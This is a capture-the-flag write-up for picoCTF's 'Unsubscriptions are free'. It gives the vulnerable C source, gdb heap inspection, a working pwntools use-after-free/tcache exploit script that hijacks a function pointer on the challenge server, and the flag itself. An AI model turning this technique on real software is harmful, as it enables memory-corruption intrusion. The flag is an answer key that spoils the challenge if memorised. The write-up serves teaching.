# Writeup - Unsubscriptions are free
Category: Binary Exploitation, Points: 100


## Descpriton
> Check out my new video-game and spaghetti-eating streaming channel on Twixer! 


## Vulnerability

Given the source code:
```c
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>

#define FLAG_BUFFER 200
#define LINE_BUFFER_SIZE 20


typedef struct {
  uintptr_t (*whatToDo)();
  char *username;
} cmd;

char choice;
cmd *user;

void hahaexploitgobrrr(){
  char buf[FLAG_BUFFER];
  FILE *f = fopen("flag.txt","r");
  fgets(buf,FLAG_BUFFER,f);
  fprintf(stdout,"%s\n",buf);
  fflush(stdout);
}

char * getsline(void) {
  getchar();
  char * line = malloc(100), * linep = line;
  size_t lenmax = 100, len = lenmax;
  int c;
  if(line == NULL)
    return NULL;
  for(;;) {
    c = fgetc(stdin);
    if(c == EOF)
      break;
    if(--len == 0) {
      len = lenmax;
      char * linen = realloc(linep, lenmax *= 2);

      if(linen == NULL) {
        free(linep);
        return NULL;
      }
      line = linen + (line - linep);
      linep = linen;
    }

    if((*line++ = c) == '\n')
      break;
  }
  *line = '\0';
  return linep;
}

void doProcess(cmd* obj) {
  (*obj->whatToDo)();
}

void s(){
  printf("OOP! Memory leak...%p\n",hahaexploitgobrrr);
  puts("Thanks for subsribing! I really recommend becoming a premium member!");
}

void p(){
  puts("Membership pending... (There's also a super-subscription you can also get for twice the price!)");
}

void m(){
  puts("Account created.");
}

void leaveMessage(){
  puts("I only read premium member messages but you can ");
  puts("try anyways:");
  char* msg = (char*)malloc(8);
  read(0, msg, 8);
}

void i(){
  char response;
  puts("You're leaving already(Y/N)?");
  scanf(" %c", &response);
  if(toupper(response)=='Y'){
    puts("Bye!");
    free(user);
  }else{
    puts("Ok. Get premium membership please!");
  }
}

void printMenu(){
  puts("Welcome to my stream! ^W^");
  puts("==========================");
  puts("(S)ubscribe to my channel");
  puts("(I)nquire about account deletion");
  puts("(M)ake an Twixer account");
  puts("(P)ay for premium membership");
  puts("(l)eave a message(with or without logging in)");
  puts("(e)xit");
}

void processInput(){
  scanf(" %c", &choice);
  choice = toupper(choice);
  switch(choice){
    case 'S':
      if(user){
        user->whatToDo = (void*)s;
      }else{
        puts("Not logged in!");
      }
      break;
    case 'P':
      user->whatToDo = (void*)p;
      break;
    case 'I':
      user->whatToDo = (void*)i;
      break;
    case 'M':
      user->whatToDo = (void*)m;
      puts("===========================");
      puts("Registration: Welcome to Twixer!");
      puts("Enter your username: ");
      user->username = getsline();
      break;
    case 'L':
      leaveMessage();
      break;
    case 'E':
      exit(0);
    default:
      puts("Invalid option!");
      exit(1);
      break;
  }
}

int main(){
  setbuf(stdout, NULL);
  user = (cmd *)malloc(sizeof(user));
  while(1){
    printMenu();
    processInput();
    //if(user){
    doProcess(user);
    //}
  }
  return 0;
}
```

Let's look at the `main` function. It `malloc`s and returns a `user` pointer. Then the while loop runs 3 functions. `printMenu`, `processInput` and `doProcess`. `processInput` asks the user to input a single char, and then changes the value of `user->whatToDo` to the corresponding function, except for the letter `l`. For `l` it simply calls the function `leaveMessage` which `malloc`s 8 bytes and returns the `msg` pointer. Data is then `read` into `msg`.

For context, the `i` function essentially `free`s the `user`. If the `user` wishes to delete their account.

So far so good.

Now there is a function called `hahaexploitgobrrr` which `puts` the `flag` into `stdout`. Ideally we would want to call this function. How do we do that?

Notice, when the letter `S` is hit we get the output `OOP! Memory leak...0x80487d6`, The address of the function `hahaexploitgobrrr`.

Notice that `doProcess` essentially calls a function. Like so

```c
void doProcess(cmd* obj) {
  (*obj->whatToDo)(); // * dereferences the obj->whatToDo function's address
}
```

We want `doProcess` to call `hahaexploitgobrrr` with its address.

```c
//what we want the code to do..
void doProcess(cmd* obj) {
  ("0x80487d6")(); // 0x80487d6 is hahaexploitgobrrr's address
}
```

How do we do that? 

The input to the `doProcess` is the `user` pointer so if we can get control over `user` pointer we can overwrite it with `hahaexploitgobrrr`s address. Then calling `doProcess` would call `hahaexploitgobrrr`, printing the `flag`. We can do this by exploiting the `free` which would give us control over `user`. 


## Exploit

We can perform a `tcache` attack to solve this problem. `tcache` is a caching mechanism implemented in GLIBC, it's a Last-In-First-Out model, as in, the last `free`d memory chunk is on top and the next `malloc` returns a pointer to the last `free`d memory chunk. Now if we `free` the `user`, the next `malloc` will return the `user`s pointer. 

Analysis:

We open the binary with `gdb ./vuln`. Then, we set 3 breakpoints.

1. A breakpoint at the first `malloc` in `main`. This will tell us the address of `user`
2. A breakpoint at the first `puts` in `i`. We want to check `tcache` before `free`ing the `user`.
3. A breakpoint at the first `puts` in `leaveMessage`. We want to check `tcache` after `free`ing the `user`.

After setting the breakpoints:

```console
gef➤  info breakpoints 
Num     Type           Disp Enb Address    What
1       breakpoint     keep y   0x08048d6f <main+58>
2       breakpoint     keep y   0x08048aa6 <i+39>
3       breakpoint     keep y   0x08048a4f <leaveMessage+46>
```

We check the address of `user` at breakpoint 1.

```console
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x0804c1a0  →  0x00000000
$ebx   : 0x0804b000  →  0x0804af0c  →  <_DYNAMIC+0> add DWORD PTR [eax], eax
$ecx   : 0x0       
$edx   : 0x0       
$esp   : 0xffffcec0  →  0x00000004
$ebp   : 0xffffced8  →  0xf7ffd020  →  0xf7ffda40  →  0x00000000
$esi   : 0xffffcfa4  →  0xffffd163  →  "/home/aszels/code/ctf/unsubsarefree/vuln"
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x08048d6f  →  <main+58> add esp, 0x10
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
─────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcec0│+0x0000: 0x00000004	 ← $esp
0xffffcec4│+0x0004: 0x00000000
0xffffcec8│+0x0008: 0xf7fbeb30  →  0xf7d8bcc6  →  "GLIBC_PRIVATE"
0xffffcecc│+0x000c: 0x08048d49  →  <main+20> add ebx, 0x22b7
0xffffced0│+0x0010: 0xffffcef0  →  0x00000001
0xffffced4│+0x0014: 0xf7f9b000  →  0x00229dac
0xffffced8│+0x0018: 0xf7ffd020  →  0xf7ffda40  →  0x00000000	 ← $ebp
0xffffcedc│+0x001c: 0xf7d92519  →  <__libc_start_call_main+121> add esp, 0x10
───────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048d65 <main+48>        sub    esp, 0xc
    0x8048d68 <main+51>        push   0x4
    0x8048d6a <main+53>        call   0x8048620 <malloc@plt>
 →  0x8048d6f <main+58>        add    esp, 0x10
    0x8048d72 <main+61>        mov    edx, eax
    0x8048d74 <main+63>        mov    eax, 0x804b060
    0x8048d7a <main+69>        mov    DWORD PTR [eax], edx
    0x8048d7c <main+71>        call   0x8048b2d <printMenu>
    0x8048d81 <main+76>        call   0x8048bd5 <processInput>
───────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x8048d6f in main (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8048d6f → main()
──────────────────────────────────────────────────────────────────────────────────────────────
gef➤ 
```

The address of `user`, `$eax = 0x0804c1a0`.

We check `tcache` at breakpoint 2.

```console
Welcome to my stream! ^W^
==========================
(S)ubscribe to my channel
(I)nquire about account deletion
(M)ake an Twixer account
(P)ay for premium membership
(l)eave a message(with or without logging in)
(e)xit
I

Breakpoint 1, 0x08048aa6 in i ()

[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x08048f62  →  "You're leaving already(Y/N)?"
$ebx   : 0x0804b000  →  0x0804af0c  →  <_DYNAMIC+0> add DWORD PTR [eax], eax
$ecx   : 0xf7fbf500  →  0xf7fbf500  →  [loop detected]
$edx   : 0x08048a7f  →  <i+0> push ebp
$esp   : 0xffffce80  →  0x08048f62  →  "You're leaving already(Y/N)?"
$ebp   : 0xffffcea8  →  0xffffceb8  →  0xffffced8  →  0xf7ffd020  →  0xf7ffda40  →  0x00000000
$esi   : 0xffffcfa4  →  0xffffd163  →  "/home/aszels/code/ctf/unsubsarefree/vuln"
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x08048aa6  →  <i+39> call 0x8048630 <puts@plt>
$eflags: [zero carry PARITY ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
─────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffce80│+0x0000: 0x08048f62  →  "You're leaving already(Y/N)?"	 ← $esp
0xffffce84│+0x0004: 0x0804b000  →  0x0804af0c  →  <_DYNAMIC+0> add DWORD PTR [eax], eax
0xffffce88│+0x0008: 0xffffcfa4  →  0xffffd163  →  "/home/aszels/code/ctf/unsubsarefree/vuln"
0xffffce8c│+0x000c: 0x08048a8b  →  <i+12> add ebx, 0x2575
0xffffce90│+0x0010: 0xffffcec8  →  0xffffced8  →  0xf7ffd020  →  0xf7ffda40  →  0x00000000
0xffffce94│+0x0014: 0xf7fd8ff4  →  <_dl_runtime_resolve+20> pop edx
0xffffce98│+0x0018: 0x00000000
0xffffce9c│+0x001c: 0xcf7dd800
───────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048a9c <i+29>           sub    esp, 0xc
    0x8048a9f <i+32>           lea    eax, [ebx-0x209e]
    0x8048aa5 <i+38>           push   eax
 →  0x8048aa6 <i+39>           call   0x8048630 <puts@plt>
   ↳   0x8048630 <puts@plt+0>     jmp    DWORD PTR ds:0x804b034
       0x8048636 <puts@plt+6>     push   0x50
       0x804863b <puts@plt+11>    jmp    0x8048580
       0x8048640 <exit@plt+0>     jmp    DWORD PTR ds:0x804b038
       0x8048646 <exit@plt+6>     push   0x58
       0x804864b <exit@plt+11>    jmp    0x8048580
───────────────────────────────────────────────────────────────────── arguments (guessed) ────
puts@plt (
   [sp + 0x0] = 0x08048f62 → "You're leaving already(Y/N)?"
)
───────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x8048aa6 in i (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8048aa6 → i()
[#1] 0x8048985 → doProcess()
[#2] 0x8048d97 → main()
──────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap bins
────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────
All tcachebins are empty
────────────────────────────── Fastbins for arena at 0xf7f9b7c0 ──────────────────────────────
Fastbins[idx=0, size=0x10] 0x00
Fastbins[idx=1, size=0x18] 0x00
Fastbins[idx=2, size=0x20] 0x00
Fastbins[idx=3, size=0x28] 0x00
Fastbins[idx=4, size=0x30] 0x00
Fastbins[idx=5, size=0x38] 0x00
Fastbins[idx=6, size=0x40] 0x00
──────────────────────────── Unsorted Bin for arena at 0xf7f9b7c0 ────────────────────────────
[+] Found 0 chunks in unsorted bin.
───────────────────────────── Small Bins for arena at 0xf7f9b7c0 ─────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
───────────────────────────── Large Bins for arena at 0xf7f9b7c0 ─────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  
```

As you can see there's nothing in `tcache`. We continue till breakpoint 3. And check `tcache` once again.

```console
gef➤  c
Continuing.
You're leaving already(Y/N)?
Y
Bye!
Welcome to my stream! ^W^
==========================
(S)ubscribe to my channel
(I)nquire about account deletion
(M)ake an Twixer account
(P)ay for premium membership
(l)eave a message(with or without logging in)
(e)xit
l
I only read premium member messages but you can 

Breakpoint 2, 0x08048a4f in leaveMessage ()

[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x08048f55  →  "try anyways:"
$ebx   : 0x0804b000  →  0x0804af0c  →  <_DYNAMIC+0> add DWORD PTR [eax], eax
$ecx   : 0xf7f9c9b4  →  0x00000000
$edx   : 0x1       
$esp   : 0xffffce90  →  0x08048f55  →  "try anyways:"
$ebp   : 0xffffceb8  →  0xffffcec8  →  0xffffced8  →  0xf7ffd020  →  0xf7ffda40  →  0x00000000
$esi   : 0xffffcfa4  →  0xffffd163  →  "/home/aszels/code/ctf/unsubsarefree/vuln"
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x08048a4f  →  <leaveMessage+46> call 0x8048630 <puts@plt>
$eflags: [zero carry parity ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
─────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffce90│+0x0000: 0x08048f55  →  "try anyways:"	 ← $esp
0xffffce94│+0x0004: 0x08048f7f  →  0x00632520 (" %c"?)
0xffffce98│+0x0008: 0xffffceb4  →  0x0804b000  →  0x0804af0c  →  <_DYNAMIC+0> add DWORD PTR [eax], eax
0xffffce9c│+0x000c: 0x08048a2d  →  <leaveMessage+12> add ebx, 0x25d3
0xffffcea0│+0x0010: 0xffffcfa4  →  0xffffd163  →  "/home/aszels/code/ctf/unsubsarefree/vuln"
0xffffcea4│+0x0014: 0xf7ffcb80  →  0x00000000
0xffffcea8│+0x0018: 0xf7da0cf9  →  <toupper+9> add ecx, 0x1fa307
0xffffceac│+0x001c: 0x08048c15  →  <processInput+64> add esp, 0x10
───────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048a45 <leaveMessage+36> sub    esp, 0xc
    0x8048a48 <leaveMessage+39> lea    eax, [ebx-0x20ab]
    0x8048a4e <leaveMessage+45> push   eax
 →  0x8048a4f <leaveMessage+46> call   0x8048630 <puts@plt>
   ↳   0x8048630 <puts@plt+0>     jmp    DWORD PTR ds:0x804b034
       0x8048636 <puts@plt+6>     push   0x50
       0x804863b <puts@plt+11>    jmp    0x8048580
       0x8048640 <exit@plt+0>     jmp    DWORD PTR ds:0x804b038
       0x8048646 <exit@plt+6>     push   0x58
       0x804864b <exit@plt+11>    jmp    0x8048580
───────────────────────────────────────────────────────────────────── arguments (guessed) ────
puts@plt (
   [sp + 0x0] = 0x08048f55 → "try anyways:",
   [sp + 0x4] = 0x08048f7f → 0x00632520 (" %c"?),
   [sp + 0x8] = 0xffffceb4 → 0x0804b000 → 0x0804af0c → <_DYNAMIC+0> add DWORD PTR [eax], eax,
   [sp + 0xc] = 0x08048a2d → <leaveMessage+12> add ebx, 0x25d3
)
───────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x8048a4f in leaveMessage (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8048a4f → leaveMessage()
[#1] 0x8048d07 → processInput()
[#2] 0x8048d86 → main()
──────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap bins
────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────
Tcachebins[idx=0, size=0x10, count=1] ←  Chunk(addr=0x804c1a0, size=0x10, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) 
────────────────────────────── Fastbins for arena at 0xf7f9b7c0 ──────────────────────────────
Fastbins[idx=0, size=0x10] 0x00
Fastbins[idx=1, size=0x18] 0x00
Fastbins[idx=2, size=0x20] 0x00
Fastbins[idx=3, size=0x28] 0x00
Fastbins[idx=4, size=0x30] 0x00
Fastbins[idx=5, size=0x38] 0x00
Fastbins[idx=6, size=0x40] 0x00
──────────────────────────── Unsorted Bin for arena at 0xf7f9b7c0 ────────────────────────────
[+] Found 0 chunks in unsorted bin.
───────────────────────────── Small Bins for arena at 0xf7f9b7c0 ─────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
───────────────────────────── Large Bins for arena at 0xf7f9b7c0 ─────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
```

Now we can see that there is a memory chunk in `tcache` with the address `0x804c1a0`. Whichi is the `user` address.

Plan:

1. We hit `S` to get the address of `hahaexploitgobrrr`.
2. We hit `I`, in turn calling the `i` function to delete the account. Essentially `free`ing `user`. This will put the `user`s memory chunk into the `tcache` bin.
3. We hit `l` to call the function `leaveMessage`. This function will call `malloc` which will check `tcache` then return `user`s pointer.
4. Input the address of `hahaexploitgobrrr`. This will overwrite the contents of `user` pointer with the functions address.

After the following steps `doProcess` will call `hahaexploitgobrrr` and print the flag.

Exploit:

```python
import sys

from pwn import *
from enum import Enum

class Commands(Enum):
  SUBSCRIBE       = "S"
  DELETE_ACCOUNT  = "I"
  CREATE_ACCOUNT  = "M"
  PAY             = "P"
  LEAVE_MESSAGE   = "L"
  EXIT            = "E"

def send_command(command):
  io.recvuntil("(e)xit\n")
  io.sendline(command.value)

def subscribe():
  log.info("Subscribing")
  memleak_line = "OOP! Memory leak..."

  send_command(Commands.SUBSCRIBE)
  line = io.recvlineS()
  if line == "Not logged in!":
    return None
  elif memleak_line in line:
    addr = int(line.replace(memleak_line, "").strip(), 16)
    log.info("Leaked address: {}".format(hex(addr)))
    io.recvline()
    return addr
  else:
    raise RuntimeError(f"Unexpected output during subscription: {line}")

def delete_account():
  log.info("Deleting account")

  send_command(Commands.DELETE_ACCOUNT)
  io.sendlineafter("You're leaving already(Y/N)?\n", "Y")
  io.recvline()

def leave_message(msg):
  log.info("Leaving message:\n{}".format(hexdump(msg)))
  send_command(Commands.LEAVE_MESSAGE)
  io.sendlineafter("try anyways:\n", msg)

def exit():
  log.info("Exiting")
  send_command(Commands.EXIT)

io = remote("mercury.picoctf.net", 4504) if sys.argv[1] == "remote" else ELF("./vuln").process()

hahaexploitgobrrr_addr = subscribe()
delete_account()
payload = p32(hahaexploitgobrrr_addr)
leave_message(payload)
log.success(io.recvlineS())
exit()
```


## Flag
`picoCTF{d0ubl3_j30p4rdy_4245f637}`

